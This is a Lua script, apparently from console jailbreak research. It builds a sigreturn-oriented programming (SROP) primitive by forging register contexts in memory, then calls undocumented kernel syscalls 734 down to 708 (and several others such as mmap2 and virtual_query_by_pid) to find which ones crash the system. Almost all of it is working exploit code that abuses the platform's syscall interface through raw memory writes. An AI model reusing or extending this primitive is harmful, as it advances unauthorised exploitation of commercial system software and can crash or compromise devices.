-- CRASH_CLASS: MODERATE
-- PROBE 147c: Test sysent 734 down to 708 via SROP
--
-- 13.60 names for reference:
-- 734=trace_ctrl, 733=get_resident_fmem_count2, 732=cffmgr_call
-- 731=fgcinfo_get_all_for_coredump, 730=fgcinfo_delete, 729=fgcinfo_add
-- 728=virtual_query_by_pid, 727=get_aio_debug_request_info
-- 726=get_aio_debug_submit_info, 725=mmap2
-- 724=dynlib_get_lid_mid_info, 723=notify_a53_bind_progress
-- 722=workspace_ctrl, 721=ampr_ctrl_debug
-- 720=acinfo_get_all_for_coredump, 719=acinfo_delete, 718=acinfo_add
-- 717=dl_get_info_2, 716=openintr, 715=ioreq
-- 714=notify_app_event, 713=get_ppr_sdk_compiled_version
-- 712=saved_app_delete, 711=app_restore, 710=app_save
-- 709=streamwrite, 708=fsc2h_ctrl
--
-- Test from 734 down. If we crash, the last printed number is the killer.

print("=== PROBE 147c: SYSENT 734 DOWN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC_S = 0x40
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc20 = make_syscall(20)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)

local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC_S + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local outbuf = gpu + 0x1000
local outlen = gpu + 0x1800

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC_S + 0xA0, sc_addr)
    wq(srop_ctx + MC_S + 0x38, uint64(num))
    wq(srop_ctx + MC_S + 0x08, a1 or uint64(0))
    wq(srop_ctx + MC_S + 0x10, a2 or uint64(0))
    wq(srop_ctx + MC_S + 0x18, a3 or uint64(0))
    wq(srop_ctx + MC_S + 0x50, a4 or uint64(0))
    wq(srop_ctx + MC_S + 0x28, a5 or uint64(0))
    wq(srop_ctx + MC_S + 0x30, a6 or uint64(0))
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- Quick baseline
print("baseline: pid=" .. hex(srop(20)))

-- Test from 734 down to 708, printing BEFORE each call
for num = 734, 708, -1 do
    -- Clear output buffer
    for off = 0, 0xFF, 4 do wd(outbuf + off, 0) end
    wq(outlen, uint64(0x100))

    print("try " .. num)
    local rv = srop(num, ua(outbuf), ua(outlen), uint64(0x100))
    if rv then
        print("  rv=" .. hex(rv))
    else
        print("  rv=FAIL")
    end
end

-- If we survived all, check a few with different arg patterns
print("")
print("--- [B] Survivors with args ---")

-- 733: get_resident_fmem_count2 — might just return a count
print("try 733(0)")
local r733 = srop(733)
print("  733 rv=" .. hex(r733))

-- 725: mmap2 — try like mmap(addr=0, len=0x4000, prot=3, flags=0x1002, fd=-1, off=0)
print("try 725 mmap2")
local r725 = srop(725, uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
print("  725 rv=" .. hex(r725))

-- 717: dl_get_info_2 — try like dynlib_get_info(593): (handle, buf)
local info2 = gpu + 0x2000
for off = 0, 0x1FF, 4 do wd(info2 + off, 0) end
wd(info2, 0x200)
print("try 717 dl_get_info_2")
local r717 = srop(717, uint64(0), ua(info2))
print("  717 rv=" .. hex(r717))

-- 728: virtual_query_by_pid
print("try 728 virtual_query_by_pid")
local r728 = srop(728, uint64(pid), ua(outbuf), uint64(0x100))
print("  728 rv=" .. hex(r728))

-- 713: get_ppr_sdk_compiled_version
print("try 713")
local r713 = srop(713, ua(outbuf))
print("  713 rv=" .. hex(r713))

-- 705: get_phys_page_size
print("try 705")
local r705 = srop(705, ua(outbuf))
print("  705 rv=" .. hex(r705))

print("")
print("pid_final=" .. to_num(sc20()))
print("=== PROBE 147c COMPLETE ===")
